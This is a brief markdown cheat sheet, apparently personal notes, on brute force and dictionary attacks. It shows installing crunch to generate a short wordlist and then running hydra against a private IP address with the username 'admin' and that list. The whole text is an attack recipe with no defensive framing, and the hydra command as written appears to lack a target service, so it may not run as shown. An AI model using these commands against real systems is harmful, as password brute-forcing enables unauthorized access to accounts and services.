### brute force & dictionary attacks
ˋˋˋsh

# sure kali source added
/etc/apt/source_list.d

# generate wordlist
apt install crunch

crunch 1 3 -o test.txt 


# brute attacks

apt install hydra

hydra 10.20.14.212 -l admin -P ./test.txt
ˋˋˋ
